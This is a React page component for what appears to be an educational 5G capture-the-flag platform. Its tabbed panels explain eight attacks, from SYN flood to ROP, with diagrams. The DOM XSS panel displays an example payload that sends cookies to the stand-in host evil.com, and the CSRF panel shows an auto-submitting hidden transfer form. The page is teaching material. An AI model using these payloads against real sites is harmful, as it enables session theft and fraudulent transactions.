import { useState } from 'react'
import { AlertTriangle, Network, Code, Eye, Cpu, Key, ShieldCheck, Bug } from 'lucide-react'
import { NetworkVisualizer } from '../components/NetworkVisualizer'
import { cn } from '../lib/cn'

/* ── Diagram helpers ── */
function Box({ label, sub, color = 'green' }: { label: string; sub?: string; color?: 'green' | 'red' | 'blue' | 'grey' }) {
  const colors = {
    green: 'bg-[#005A43] text-white border-[#004a37]',
    red: 'bg-rose-600 text-white border-rose-700',
    blue: 'bg-blue-600 text-white border-blue-700',
    grey: 'bg-slate-200 text-slate-700 border-slate-300',
  }
  return (
    <div className={cn('rounded-xl border-2 px-4 py-3 text-center shadow-sm min-w-[100px]', colors[color])}>
      <div className="text-sm font-semibold">{label}</div>
      {sub && <div className="mt-0.5 text-xs opacity-80">{sub}</div>}
    </div>
  )
}

function Arrow({ label, color = 'slate' }: { label?: string; color?: 'red' | 'slate' | 'green' }) {
  const colors = { red: 'text-rose-600', slate: 'text-slate-400', green: 'text-[#005A43]' }
  return (
    <div className="flex flex-col items-center gap-0.5 px-1">
      {label && <span className={cn('text-xs font-medium whitespace-nowrap', colors[color])}>{label}</span>}
      <span className={cn('text-xl', colors[color])}>→</span>
    </div>
  )
}

/* ── Per-attack diagrams ── */
function SynFloodDiagram() {
  return (
    <div className="space-y-4">
      <div>
        <p className="mb-2 text-xs font-semibold text-rose-600">Attack flow (queue exhausted):</p>
        <div className="flex items-center gap-1 flex-wrap">
          <Box label="Attacker" sub="spoofed IPs" color="red" />
          <Arrow label="SYN ×1000s" color="red" />
          <Box label="Server" sub="queue full" color="grey" />
          <Arrow label="refused" color="red" />
          <Box label="Legit User" sub="can't connect" color="grey" />
        </div>
      </div>
      <div className="opacity-50">
        <p className="mb-2 text-xs font-semibold text-[#005A43]">Normal 3-way handshake (blocked during flood):</p>
        <div className="flex items-center gap-1 flex-wrap">
          <Box label="Client" color="green" />
          <Arrow label="SYN" color="green" />
          <Box label="Server" color="green" />
          <Arrow label="SYN-ACK" color="green" />
          <Box label="Client" color="green" />
          <Arrow label="ACK" color="green" />
          <Box label="✓ Connected" color="green" />
        </div>
      </div>
    </div>
  )
}

function DomXssDiagram() {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-1 flex-wrap">
        <Box label="Attacker" sub="crafts URL" color="red" />
        <Arrow label="malicious link" color="red" />
        <Box label="Victim Browser" sub="loads page" color="grey" />
        <Arrow label="innerHTML sink" color="red" />
        <Box label="DOM" sub="script runs" color="red" />
        <Arrow label="exfiltrate" color="red" />
        <Box label="Attacker Server" sub="gets cookies" color="red" />
      </div>
      <div className="rounded-xl border border-rose-200 bg-rose-50 p-3 font-mono text-xs text-rose-700 space-y-1">
        <div className="text-slate-400">{'// Vulnerable code:'}</div>
        <div>{'element.innerHTML = location.hash.slice(1)'}</div>
        <div className="mt-2 text-slate-400">{'// Attacker URL payload:'}</div>
        <div>{'#<img src=x onerror="fetch(evil.com?c="+document.cookie)">'}</div>
      </div>
    </div>
  )
}

function CsrfDiagram() {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-1 flex-wrap">
        <Box label="Victim" sub="logged into bank" color="green" />
        <Arrow label="visits" color="slate" />
        <Box label="evilsite.html" sub="hidden form" color="red" />
        <Arrow label="auto POST + cookie" color="red" />
        <Box label="Bank Server" sub="processes transfer" color="grey" />
      </div>
      <div className="rounded-xl border border-rose-200 bg-rose-50 p-3 font-mono text-xs text-rose-700 space-y-1">
        <div className="text-slate-400">{'<!-- evilsite.html — fires on page load -->'}</div>
        <div>{'<form action="http://bank/transfer" method="POST">'}</div>
        <div>{'  <input name="to" value="Attacker123" />'}</div>
        <div>{'</form>'}</div>
        <div>{'<body onload="document.forms[0].submit()">'}</div>
      </div>
    </div>
  )
}

function SniffingDiagram() {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-1 flex-wrap">
        <Box label="Client" sub="sends creds" color="green" />
        <Arrow label="HTTP plaintext" color="red" />
        <Box label="Network" sub="shared segment" color="grey" />
        <Arrow label="reaches" color="slate" />
        <Box label="Server" color="green" />
      </div>
      <div className="flex justify-center">
        <div className="flex flex-col items-center gap-1">
          <span className="text-rose-500 text-lg font-bold">↑ captures silently</span>
          <Box label="Sniffer" sub="Wireshark / tcpdump" color="red" />
        </div>
      </div>
    </div>
  )
}

function TimingDiagram() {
  return (
    <div className="space-y-4">
      <p className="text-xs text-slate-500">Response time reveals how many characters matched:</p>
      <div className="space-y-2">
        {[
          { guess: '"aaaa…"', ms: 6, label: '' },
          { guess: '"paaa…"', ms: 22, label: '' },
          { guess: '"pass…"', ms: 84, label: '← longer = more matched' },
        ].map((row, i) => (
          <div key={i} className="flex items-center gap-3">
            <span className="w-20 font-mono text-xs text-slate-600 shrink-0">{row.guess}</span>
            <div className="h-5 rounded bg-rose-400 transition-all" style={{ width: `${row.ms}px` }} />
            <span className="text-xs text-slate-500">{row.ms / 20} ms</span>
            {row.label && <span className="text-xs font-semibold text-[#005A43]">{row.label}</span>}
          </div>
        ))}
      </div>
      <div className="rounded-xl border border-rose-200 bg-rose-50 p-3 font-mono text-xs text-rose-700 space-y-1">
        <div className="text-slate-400">{'// Vulnerable early-exit comparison:'}</div>
        <div>{'for (let i = 0; i < secret.length; i++) {'}</div>
        <div>{'  if (guess[i] !== secret[i]) return false; // exits early!'}</div>
        <div>{'}'}</div>
      </div>
    </div>
  )
}

function MitmCryptoDiagram() {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-1 flex-wrap">
        <Box label="Plaintext P" color="green" />
        <Arrow label="Encrypt K₁" color="slate" />
        <Box label="Middle X" sub="2⁵⁶ values" color="grey" />
        <Arrow label="Encrypt K₂" color="slate" />
        <Box label="Ciphertext C" color="green" />
      </div>
      <div className="flex items-center gap-1 flex-wrap">
        <Box label="Known P" color="blue" />
        <Arrow label="all K₁ →" color="red" />
        <Box label="Lookup Table" sub="stored ~2⁵⁶" color="red" />
        <Arrow label="← decrypt C" color="red" />
        <Box label="Known C" color="blue" />
      </div>
      <p className="text-xs text-slate-500">Match in table reveals both keys. Cost: 2⁵⁷ instead of 2¹¹²</p>
    </div>
  )
}

function RopDiagram() {
  return (
    <div className="grid grid-cols-2 gap-4">
      <div>
        <p className="mb-2 text-xs font-semibold text-[#005A43]">Normal stack:</p>
        <div className="rounded-xl border border-slate-200 bg-slate-50 p-3 font-mono text-xs space-y-1">
          <div className="rounded bg-[#005A43]/10 p-1.5 text-slate-700">local variables</div>
          <div className="rounded bg-[#005A43]/10 p-1.5 text-slate-700">stack canary ✓</div>
          <div className="rounded bg-[#005A43]/10 p-1.5 text-slate-700">saved RBP</div>
          <div className="rounded bg-[#005A43]/20 p-1.5 font-bold text-[#005A43]">ret → main()</div>
        </div>
      </div>
      <div>
        <p className="mb-2 text-xs font-semibold text-rose-600">After ROP overflow:</p>
        <div className="rounded-xl border border-rose-200 bg-rose-50 p-3 font-mono text-xs space-y-1">
          <div className="rounded bg-rose-100 p-1.5 text-rose-700">overflow data…</div>
          <div className="rounded bg-rose-100 p-1.5 text-rose-700">overflow data…</div>
          <div className="rounded bg-rose-200 p-1.5 font-bold text-rose-700">ret → gadget 1</div>
          <div className="rounded bg-rose-200 p-1.5 text-rose-700">→ gadget 2</div>
          <div className="rounded bg-rose-400 p-1.5 font-bold text-white">→ execve("/bin/sh")</div>
        </div>
      </div>
    </div>
  )
}

function AptDiagram() {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-1 flex-wrap">
        <Box label="Attacker UE" sub="malicious device" color="red" />
        <Arrow label="crafted NAS msg" color="red" />
        <Box label="AMF" sub="no auth check" color="grey" />
        <Arrow label="forwards" color="red" />
        <Box label="SMF / UPF" sub="core access" color="red" />
      </div>
      <div className="rounded-xl border border-[#005A43]/20 bg-[#f0faf5] p-3 text-xs text-slate-600 space-y-1">
        <div className="font-semibold text-[#005A43] mb-1">5G Core Network Functions:</div>
        <div><span className="font-medium">AMF</span> — Access & Mobility Management (entry point for NAS)</div>
        <div><span className="font-medium">SMF</span> — Session Management (creates/manages data sessions)</div>
        <div><span className="font-medium">UPF</span> — User Plane Function (routes actual data traffic)</div>
        <div><span className="font-medium">UE</span> — User Equipment (phone/device — attacker controlled)</div>
      </div>
    </div>
  )
}

type AttackTab = {
  id: string
  label: string
  icon: React.ReactNode
  category: string
  categoryColor: string
  description: string
  howItWorks: string[]
  diagram: React.ReactNode
  hasSynVisualizer?: boolean
}

const attacks: AttackTab[] = [
  {
    id: 'syn',
    label: 'TCP SYN Flood',
    icon: <Network className="h-4 w-4" />,
    category: 'Network',
    categoryColor: 'bg-rose-100 text-rose-700 ring-rose-200',
    description:
      'An attacker floods a server with TCP SYN packets using spoofed source IPs. The server allocates state for each half-open connection, exhausting its backlog queue and denying service to legitimate users.',
    howItWorks: [
      'Attacker sends thousands of SYN packets with spoofed/random source IPs',
      'Server responds with SYN-ACK and allocates a TCB for each connection',
      'No ACK ever arrives — connections stay half-open until timeout',
      'Backlog queue exhausts — all new legitimate connections are refused',
    ],
    diagram: <SynFloodDiagram />,
    hasSynVisualizer: true,
  },
  {
    id: 'dom-xss',
    label: 'DOM XSS',
    icon: <Code className="h-4 w-4" />,
    category: 'Web',
    categoryColor: 'bg-blue-100 text-blue-700 ring-blue-200',
    description:
      "Attacker-controlled data (e.g., from the URL hash) is written into the DOM via unsafe sinks like innerHTML. The browser executes the injected script in the victim's security context, stealing cookies or tokens.",
    howItWorks: [
      'Attacker crafts a URL with a malicious script in the fragment/query string',
      'Victim clicks the link — page JS reads location.hash without sanitizing',
      'Unsanitized value assigned to innerHTML — browser parses as HTML+JS',
      "Script executes in victim's session context — cookies/data exfiltrated",
    ],
    diagram: <DomXssDiagram />,
  },
  {
    id: 'csrf',
    label: 'CSRF',
    icon: <Bug className="h-4 w-4" />,
    category: 'Web',
    categoryColor: 'bg-blue-100 text-blue-700 ring-blue-200',
    description:
      "The attacker tricks a logged-in user's browser into sending an authenticated forged request to a target server. The server cannot distinguish it from a real user action since both carry the same session cookie.",
    howItWorks: [
      "Victim is authenticated on bank.com — session cookie active in browser",
      'Victim visits attacker-controlled evilsite.html via phishing link',
      'Hidden form auto-submits a POST to bank.com/transfer on page load',
      "Browser attaches session cookie automatically — bank processes the transfer",
    ],
    diagram: <CsrfDiagram />,
  },
  {
    id: 'sniffing',
    label: 'Packet Sniffing',
    icon: <Eye className="h-4 w-4" />,
    category: 'Network',
    categoryColor: 'bg-rose-100 text-rose-700 ring-rose-200',
    description:
      'On shared network segments, a passive attacker sets their NIC to promiscuous mode to capture all passing frames. Plaintext protocols expose credentials, session tokens, and API keys directly.',
    howItWorks: [
      'Attacker joins same network segment as victim (Wi-Fi, LAN)',
      'NIC set to promiscuous mode — captures all frames regardless of destination',
      'Tools like Wireshark reconstruct full TCP streams from raw packets',
      'HTTP/FTP/Telnet traffic reveals passwords and session cookies in plaintext',
    ],
    diagram: <SniffingDiagram />,
  },
  {
    id: 'timing',
    label: 'Timing Side-Channel',
    icon: <Cpu className="h-4 w-4" />,
    category: 'Cryptography',
    categoryColor: 'bg-purple-100 text-purple-700 ring-purple-200',
    description:
      "Password comparisons that exit early on the first mismatch take less time for wrong guesses. By precisely measuring response times, attackers infer how many characters matched — enabling character-by-character recovery.",
    howItWorks: [
      'Attacker sends many auth requests varying one character at a time',
      'Measures precise server response time for each attempt (~microseconds)',
      'Early-exit: wrong first char returns fastest → matching char takes longer',
      'Repeat per position — full password recoverable in O(n × alphabet) tries',
    ],
    diagram: <TimingDiagram />,
  },
  {
    id: 'mitm',
    label: 'Meet-in-the-Middle',
    icon: <Key className="h-4 w-4" />,
    category: 'Cryptography',
    categoryColor: 'bg-purple-100 text-purple-700 ring-purple-200',
    description:
      'Double-encryption (2DES) appears to give 2¹¹² security but actually offers only ~2⁵⁷. An attacker with known plaintext precomputes from both ends and matches in the middle — halving the effective keyspace.',
    howItWorks: [
      'Attacker obtains known plaintext P and its ciphertext C = E(K₂, E(K₁, P))',
      'Forward pass: encrypt P with all 2⁵⁶ possible K₁ values, store results',
      'Backward pass: decrypt C with all 2⁵⁶ possible K₂ values',
      'Match between tables reveals K₁ and K₂ — cost is 2⁵⁷, not 2¹¹²',
    ],
    diagram: <MitmCryptoDiagram />,
  },
  {
    id: 'rop',
    label: 'ROP Attack',
    icon: <Cpu className="h-4 w-4" />,
    category: 'Systems',
    categoryColor: 'bg-orange-100 text-orange-700 ring-orange-200',
    description:
      'After overflowing a stack buffer to overwrite the return address, the attacker chains existing code "gadgets" (instruction sequences ending in RET) to achieve arbitrary execution without injecting new code — bypassing DEP/NX.',
    howItWorks: [
      'Attacker identifies a stack buffer overflow in the target binary',
      'Scans binary and loaded libraries for ROP gadgets (instructions ending in RET)',
      'Constructs a chain of return addresses on the stack pointing to gadgets',
      'Each RET pops next gadget address — chain computes attacker logic without shellcode',
    ],
    diagram: <RopDiagram />,
  },
  {
    id: 'apt',
    label: 'APT Config Exploit',
    icon: <ShieldCheck className="h-4 w-4" />,
    category: '5G Protocol',
    categoryColor: 'bg-[#005A43]/10 text-[#005A43] ring-[#005A43]/20',
    description:
      'Misconfigured 5G core network functions (AMF, SMF, UPF) accept unauthenticated NAS messages or expose administrative interfaces. Attackers send crafted messages to gain unauthorized access to the core network.',
    howItWorks: [
      'Attacker identifies exposed 5G NF service interface (e.g., AMF SBI endpoint)',
      'Sends crafted NAS Registration Request with manipulated/forged parameters',
      'Misconfigured AMF accepts without proper integrity or auth verification',
      'Attacker gains core access — can create sessions, pivot to other NFs',
    ],
    diagram: <AptDiagram />,
  },
]

export function AttackDemoPage() {
  const [activeId, setActiveId] = useState('syn')
  const active = attacks.find((a) => a.id === activeId)!

  return (
    <div>
      {/* Header */}
      <div className="flex items-start justify-between gap-4">
        <div className="flex items-start gap-3">
          <div className="grid h-9 w-9 place-items-center rounded-xl bg-rose-100 ring-1 ring-rose-200">
            <AlertTriangle className="h-5 w-5 text-rose-600" />
          </div>
          <div>
            <div className="text-xl font-semibold tracking-tight text-slate-900">Attack Demo</div>
            <div className="mt-1 text-sm text-slate-500">
              Visual explanations for all 8 attack types from the CTF5G platform.
            </div>
          </div>
        </div>
        <span className="inline-flex items-center gap-1.5 rounded-full bg-rose-100 px-3 py-1 text-xs font-medium text-rose-700 ring-1 ring-rose-200">
          <AlertTriangle className="h-3.5 w-3.5" />
          Simulation Only
        </span>
      </div>

      {/* Attack type tabs */}
      <div className="mt-5 flex flex-wrap gap-2">
        {attacks.map((a) => (
          <button
            key={a.id}
            onClick={() => setActiveId(a.id)}
            className={cn(
              'inline-flex items-center gap-1.5 rounded-xl px-3 py-2 text-sm font-medium transition',
              activeId === a.id
                ? 'bg-[#005A43] text-white shadow-sm'
                : 'bg-white text-slate-600 ring-1 ring-[#005A43]/15 hover:bg-[#f0faf5] hover:text-[#005A43]',
            )}
          >
            {a.icon}
            {a.label}
          </button>
        ))}
      </div>

      {/* Active attack panel */}
      <div className="mt-4 rounded-2xl border border-[#005A43]/10 bg-white p-6 shadow-sm">
        <div className="flex flex-wrap items-center gap-3">
          <span className={cn('inline-flex items-center rounded-full px-2.5 py-1 text-xs font-medium ring-1', active.categoryColor)}>
            {active.category}
          </span>
          <h2 className="text-lg font-semibold text-slate-900">{active.label}</h2>
        </div>

        <p className="mt-3 text-sm leading-relaxed text-slate-600">{active.description}</p>

        {/* Step-by-step flow */}
        <div className="mt-5">
          <div className="mb-3 text-xs font-semibold uppercase tracking-wider text-[#005A43]/60">
            Attack Flow — Step by Step
          </div>
          <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-4">
            {active.howItWorks.map((step, i) => (
              <div key={i} className="flex gap-3 rounded-xl border border-[#005A43]/10 bg-[#f0faf5] p-3">
                <div className="grid h-6 w-6 shrink-0 place-items-center rounded-lg bg-[#005A43] text-xs font-bold text-white">
                  {i + 1}
                </div>
                <p className="text-xs leading-relaxed text-slate-700">{step}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Diagram */}
        <div className="mt-5">
          <div className="mb-3 text-xs font-semibold uppercase tracking-wider text-[#005A43]/60">
            Visual Diagram
          </div>
          <div className="overflow-x-auto rounded-xl border border-[#005A43]/10 bg-[#f0faf5] p-4">
            {active.diagram}
          </div>
        </div>

        {/* SYN Flood live visualizer */}
        {active.hasSynVisualizer && (
          <div className="mt-5">
            <div className="mb-3 text-xs font-semibold uppercase tracking-wider text-[#005A43]/60">
              Live Network Visualizer
            </div>
            <NetworkVisualizer />
          </div>
        )}
      </div>
    </div>
  )
}
